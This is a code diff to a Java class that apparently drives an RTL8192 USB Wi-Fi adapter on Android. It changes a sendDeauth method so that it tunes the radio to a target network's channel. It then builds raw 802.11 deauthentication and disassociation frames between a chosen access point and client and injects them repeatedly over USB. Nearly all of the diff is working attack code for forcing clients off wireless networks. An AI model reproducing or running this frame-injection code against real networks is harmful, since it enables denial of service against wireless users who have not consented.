@@ -2383,10 +2383,7 @@ public class Rtl8192Card extends UsbSource
 				} 
 				else if (l < 0) 
 				{
-					//updateDeviceStatusStringOnUi("Failed to do bulk transfer "+l);
-					//updateStatusStringOnUi("Error");
 					Log.e(TAG, "Failed to do bulkio");
-					//return;
 				}
 
 			}
@@ -2529,182 +2526,172 @@ public class Rtl8192Card extends UsbSource
 		byte packet[] = new byte[26+32];
 		byte s_bssid[] = new byte[6];
 		byte s_hwaddr[] = new byte[6];
+		int channel;
 		
+		// lock on the appropriate channel
+		Band band = Band.instance();
+		channel = 0;
+		for (int i=0;i<band.networks.size();i++)
+			if (band.networks.get(i).bssid.equals(bssid))
+				channel = band.networks.get(i).channel;
 
-		// get hwaddr and bssid
-		s_hwaddr[0]=(byte)Integer.parseInt(hwaddr.substring(0, 2),16);
-		s_hwaddr[1]=(byte)Integer.parseInt(hwaddr.substring(3, 5),16);
-		s_hwaddr[2]=(byte)Integer.parseInt(hwaddr.substring(6, 8),16);
-		s_hwaddr[3]=(byte)Integer.parseInt(hwaddr.substring(9, 11),16);
-		s_hwaddr[4]=(byte)Integer.parseInt(hwaddr.substring(12, 14),16);
-		s_hwaddr[5]=(byte)Integer.parseInt(hwaddr.substring(15, 17),16);
-		
-		s_bssid[0]=(byte)Integer.parseInt(bssid.substring(0, 2),16);
-		s_bssid[1]=(byte)Integer.parseInt(bssid.substring(3, 5),16);
-		s_bssid[2]=(byte)Integer.parseInt(bssid.substring(6, 8),16);
-		s_bssid[3]=(byte)Integer.parseInt(bssid.substring(9, 11),16);
-		s_bssid[4]=(byte)Integer.parseInt(bssid.substring(12, 14),16);
-		s_bssid[5]=(byte)Integer.parseInt(bssid.substring(15, 17),16);
-		
-		
-		// Zero out the packet
-		for (int i=0;i<26+32;i++) packet[i]=0;
-		val = val1 = val2 = val3 = val4 = val5 = val6 = val7 =0;
-
-		// val: usb bits 31,26,27 size at first 16 bits, offset at next 8
-		val = (32<<16)|(pktlen)|(1<<31)|(1<<26)|(1<<27);
-		// val1: bit 6 , queue id (0x12) 5 bits at 8
-		val1 = (1<<6)|(0x12<<8);
-		// val2/3/4/6=0
-		// val5: 0x1f at 8, 0xf at 14 
-		val5 = (0x1f<<8)|(0xf<<13);
-		
-		// fill in the values
-		packet[0]=(byte)(val&0xff);
-		packet[1]=(byte)((val>>8)&0xff);
-		packet[2]=(byte)((val>>16)&0xff);
-		packet[3]=(byte)((val>>24)&0xff);
-		packet[4]=(byte)(val1&0xff);
-		packet[5]=(byte)((val1>>8)&0xff);
-		packet[6]=(byte)((val1>>16)&0xff);
-		packet[7]=(byte)((val1>>24)&0xff);
-		packet[8]=(byte)(val2&0xff);
-		packet[9]=(byte)((val2>>8)&0xff);
-		packet[10]=(byte)((val2>>16)&0xff);
-		packet[11]=(byte)((val2>>24)&0xff);
-		packet[12]=(byte)(val3&0xff);
-		packet[13]=(byte)((val3>>8)&0xff);
-		packet[14]=(byte)((val3>>16)&0xff);
-		packet[15]=(byte)((val3>>24)&0xff);
-		packet[16]=(byte)(val4&0xff);
-		packet[17]=(byte)((val4>>8)&0xff);
-		packet[18]=(byte)((val4>>16)&0xff);
-		packet[19]=(byte)((val4>>24)&0xff);
-		packet[20]=(byte)(val5&0xff);
-		packet[21]=(byte)((val5>>8)&0xff);
-		packet[22]=(byte)((val5>>16)&0xff);
-		packet[23]=(byte)((val5>>24)&0xff);
-		packet[24]=(byte)(val6&0xff);
-		packet[25]=(byte)((val6>>8)&0xff);
-		packet[26]=(byte)((val6>>16)&0xff);
-		packet[27]=(byte)((val6>>24)&0xff);
-		packet[28]=(byte)(val7&0xff);
-		packet[29]=(byte)((val7>>8)&0xff);
-		packet[30]=(byte)((val7>>16)&0xff);
-		packet[31]=(byte)((val7>>24)&0xff);
-		
-		// checksum
-		val7 = (val7 &(~((0xffffffff>>(32-16))<<0))) | ((0&(0xffffffff>>(32-16)))<<0);
-		int checksum=0;
-		for (int a=0;a<16;a++)
+		synchronized(channel_lock)
 		{
-			int v = packet[a*2] | (packet[a*2+1]<<8);
-			checksum = checksum ^ v;
-		}
-		val7 = (val7 &(~((0xffffffff>>(32-16))<<0))) | ((checksum&(0xffffffff>>(32-16)))<<0);
-		packet[28]=(byte)(val7&0xff);
-		packet[29]=(byte)((val7>>8)&0xff);
-		
-		for (int k=0;k<5;k++)
-		{
-			// now the first deauth frame
+			setChannel(channel);
+			// get hwaddr and bssid
+			s_hwaddr[0]=(byte)Integer.parseInt(hwaddr.substring(0, 2),16);
+			s_hwaddr[1]=(byte)Integer.parseInt(hwaddr.substring(3, 5),16);
+			s_hwaddr[2]=(byte)Integer.parseInt(hwaddr.substring(6, 8),16);
+			s_hwaddr[3]=(byte)Integer.parseInt(hwaddr.substring(9, 11),16);
+			s_hwaddr[4]=(byte)Integer.parseInt(hwaddr.substring(12, 14),16);
+			s_hwaddr[5]=(byte)Integer.parseInt(hwaddr.substring(15, 17),16);
 			
-			packet[32]=(byte)0xc0;
-			packet[33]=(byte)0x0;
-			packet[34]=(byte)0x3a;
-			packet[35]=(byte)0x01;
+			s_bssid[0]=(byte)Integer.parseInt(bssid.substring(0, 2),16);
+			s_bssid[1]=(byte)Integer.parseInt(bssid.substring(3, 5),16);
+			s_bssid[2]=(byte)Integer.parseInt(bssid.substring(6, 8),16);
+			s_bssid[3]=(byte)Integer.parseInt(bssid.substring(9, 11),16);
+			s_bssid[4]=(byte)Integer.parseInt(bssid.substring(12, 14),16);
+			s_bssid[5]=(byte)Integer.parseInt(bssid.substring(15, 17),16);
 			
-			packet[36]=(byte)s_bssid[0];
-			packet[37]=(byte)s_bssid[1];
-			packet[38]=(byte)s_bssid[2];
-			packet[39]=(byte)s_bssid[3];
-			packet[40]=(byte)s_bssid[4];
-			packet[41]=(byte)s_bssid[5];
-			packet[42]=(byte)s_hwaddr[0];
-			packet[43]=(byte)s_hwaddr[1];
-			packet[44]=(byte)s_hwaddr[2];
-			packet[45]=(byte)s_hwaddr[3];
+			
+			// Zero out the packet
+			for (int i=0;i<26+32;i++) packet[i]=0;
+			val = val1 = val2 = val3 = val4 = val5 = val6 = val7 =0;
 	
-			packet[46]=(byte)s_hwaddr[4];
-			packet[47]=(byte)s_hwaddr[5];
-			packet[48]=(byte)s_bssid[0];
-			packet[49]=(byte)s_bssid[1];
-			packet[50]=(byte)s_bssid[2];
-			packet[51]=(byte)s_bssid[3];
-			packet[52]=(byte)s_bssid[4];
-			packet[53]=(byte)s_bssid[5];
-	
-			packet[54]=(byte)(((k*4))<<4);
-			packet[55]=(byte)((k*4+1));
-			packet[56]=0x03;
-			packet[57]=0x00;
+			// val: usb bits 31,26,27 size at first 16 bits, offset at next 8
+			val = (32<<16)|(pktlen)|(1<<31)|(1<<26)|(1<<27);
+			// val1: bit 6 , queue id (0x12) 5 bits at 8
+			val1 = (1<<6)|(0x12<<8);
+			// val2/3/4/6=0
+			// val5: 0x1f at 8, 0xf at 14 
+			val5 = (0x1f<<8)|(0xf<<13);
 			
-			// send teh frame!
-			if ((mConnection!=null)&&(mInjBulkEndpoint!=null))
+			// fill in the values
+			packet[0]=(byte)(val&0xff);
+			packet[1]=(byte)((val>>8)&0xff);
+			packet[2]=(byte)((val>>16)&0xff);
+			packet[3]=(byte)((val>>24)&0xff);
+			packet[4]=(byte)(val1&0xff);
+			packet[5]=(byte)((val1>>8)&0xff);
+			packet[6]=(byte)((val1>>16)&0xff);
+			packet[7]=(byte)((val1>>24)&0xff);
+			packet[8]=(byte)(val2&0xff);
+			packet[9]=(byte)((val2>>8)&0xff);
+			packet[10]=(byte)((val2>>16)&0xff);
+			packet[11]=(byte)((val2>>24)&0xff);
+			packet[12]=(byte)(val3&0xff);
+			packet[13]=(byte)((val3>>8)&0xff);
+			packet[14]=(byte)((val3>>16)&0xff);
+			packet[15]=(byte)((val3>>24)&0xff);
+			packet[16]=(byte)(val4&0xff);
+			packet[17]=(byte)((val4>>8)&0xff);
+			packet[18]=(byte)((val4>>16)&0xff);
+			packet[19]=(byte)((val4>>24)&0xff);
+			packet[20]=(byte)(val5&0xff);
+			packet[21]=(byte)((val5>>8)&0xff);
+			packet[22]=(byte)((val5>>16)&0xff);
+			packet[23]=(byte)((val5>>24)&0xff);
+			packet[24]=(byte)(val6&0xff);
+			packet[25]=(byte)((val6>>8)&0xff);
+			packet[26]=(byte)((val6>>16)&0xff);
+			packet[27]=(byte)((val6>>24)&0xff);
+			packet[28]=(byte)(val7&0xff);
+			packet[29]=(byte)((val7>>8)&0xff);
+			packet[30]=(byte)((val7>>16)&0xff);
+			packet[31]=(byte)((val7>>24)&0xff);
+			
+			// checksum
+			val7 = (val7 &(~((0xffffffff>>(32-16))<<0))) | ((0&(0xffffffff>>(32-16)))<<0);
+			int checksum=0;
+			for (int a=0;a<16;a++)
 			{
-				int l = mConnection.bulkTransfer(mInjBulkEndpoint, packet, packet.length, 100);
-				
-				if (l < 0)
-				{
-					updateDeviceStatusStringOnUi("Failed to do out bulk transfer "+l);
-					updateStatusStringOnUi("Error");
-					Log.e(TAG, "Failed to do bulkio");
-					return;
-				}
-				else
-				{
-				}
+				int v = packet[a*2] | (packet[a*2+1]<<8);
+				checksum = checksum ^ v;
 			}
+			val7 = (val7 &(~((0xffffffff>>(32-16))<<0))) | ((checksum&(0xffffffff>>(32-16)))<<0);
+			packet[28]=(byte)(val7&0xff);
+			packet[29]=(byte)((val7>>8)&0xff);
 			
-			// now the second deauth frame
-			packet[32]=(byte)0xc0;
-			packet[33]=(byte)0x0;
-			packet[34]=(byte)0x3a;
-			packet[35]=(byte)0x01;
-			
-			packet[36]=(byte)s_hwaddr[0];
-			packet[37]=(byte)s_hwaddr[1];
-			packet[38]=(byte)s_hwaddr[2];
-			packet[39]=(byte)s_hwaddr[3];
-			packet[40]=(byte)s_hwaddr[4];
-			packet[41]=(byte)s_hwaddr[5];
-			packet[42]=(byte)s_bssid[0];
-			packet[43]=(byte)s_bssid[1];
-			packet[44]=(byte)s_bssid[2];
-			packet[45]=(byte)s_bssid[3];
-	
-			packet[46]=(byte)s_bssid[4];
-			packet[47]=(byte)s_bssid[5];
-			packet[48]=(byte)s_bssid[0];
-			packet[49]=(byte)s_bssid[1];
-			packet[50]=(byte)s_bssid[2];
-			packet[51]=(byte)s_bssid[3];
-			packet[52]=(byte)s_bssid[4];
-			packet[53]=(byte)s_bssid[5];
-	
-			packet[54]=(byte)(((k*4+2))<<4);
-			packet[55]=(byte)((k*4+3));
-			packet[56]=0x03;
-			packet[57]=0x00;
-			
-			// send teh frame!
-			if ((mConnection!=null)&&(mInjBulkEndpoint!=null))
+			for (int k=0;k<5;k++)
 			{
-				int l = mConnection.bulkTransfer(mInjBulkEndpoint, packet, packet.length, 100);
+				// now the first deauth frame
 				
-				if (l < 0)
+				//packet[32]=(byte)0xc0;
+				packet[32]=(byte)0xa0;
+				packet[33]=(byte)0x0;
+				packet[34]=(byte)0x3a;
+				packet[35]=(byte)0x01;
+				
+				packet[36]=(byte)s_bssid[0];
+				packet[37]=(byte)s_bssid[1];
+				packet[38]=(byte)s_bssid[2];
+				packet[39]=(byte)s_bssid[3];
+				packet[40]=(byte)s_bssid[4];
+				packet[41]=(byte)s_bssid[5];
+				packet[42]=(byte)s_hwaddr[0];
+				packet[43]=(byte)s_hwaddr[1];
+				packet[44]=(byte)s_hwaddr[2];
+				packet[45]=(byte)s_hwaddr[3];
+		
+				packet[46]=(byte)s_hwaddr[4];
+				packet[47]=(byte)s_hwaddr[5];
+				packet[48]=(byte)s_bssid[0];
+				packet[49]=(byte)s_bssid[1];
+				packet[50]=(byte)s_bssid[2];
+				packet[51]=(byte)s_bssid[3];
+				packet[52]=(byte)s_bssid[4];
+				packet[53]=(byte)s_bssid[5];
+		
+				packet[54]=(byte)(((k*4))<<4);
+				packet[55]=(byte)((k*4+1));
+				packet[56]=0x03;
+				packet[57]=0x00;
+				
+				// send teh frame!
+				if ((mConnection!=null)&&(mInjBulkEndpoint!=null))
 				{
-					updateDeviceStatusStringOnUi("Failed to do out bulk transfer "+l);
-					updateStatusStringOnUi("Error");
-					Log.e(TAG, "Failed to do bulkio");
-					return;
+					int l = mConnection.bulkTransfer(mInjBulkEndpoint, packet, packet.length, 100);
 				}
-				else
+				
+				// now the second deauth frame
+				//packet[32]=(byte)0xc0;
+				packet[32]=(byte)0xa0;
+				packet[33]=(byte)0x0;
+				packet[34]=(byte)0x3a;
+				packet[35]=(byte)0x01;
+				
+				packet[36]=(byte)s_hwaddr[0];
+				packet[37]=(byte)s_hwaddr[1];
+				packet[38]=(byte)s_hwaddr[2];
+				packet[39]=(byte)s_hwaddr[3];
+				packet[40]=(byte)s_hwaddr[4];
+				packet[41]=(byte)s_hwaddr[5];
+				packet[42]=(byte)s_bssid[0];
+				packet[43]=(byte)s_bssid[1];
+				packet[44]=(byte)s_bssid[2];
+				packet[45]=(byte)s_bssid[3];
+		
+				packet[46]=(byte)s_bssid[4];
+				packet[47]=(byte)s_bssid[5];
+				packet[48]=(byte)s_bssid[0];
+				packet[49]=(byte)s_bssid[1];
+				packet[50]=(byte)s_bssid[2];
+				packet[51]=(byte)s_bssid[3];
+				packet[52]=(byte)s_bssid[4];
+				packet[53]=(byte)s_bssid[5];
+		
+				packet[54]=(byte)(((k*4+2))<<4);
+				packet[55]=(byte)((k*4+3));
+				packet[56]=0x03;
+				packet[57]=0x00;
+				
+				// send teh frame!
+				if ((mConnection!=null)&&(mInjBulkEndpoint!=null))
 				{
+					int l = mConnection.bulkTransfer(mInjBulkEndpoint, packet, packet.length, 100);
 				}
 			}
 		}
-
 		super.sendDeauth(bssid, hwaddr);
 	}
 	
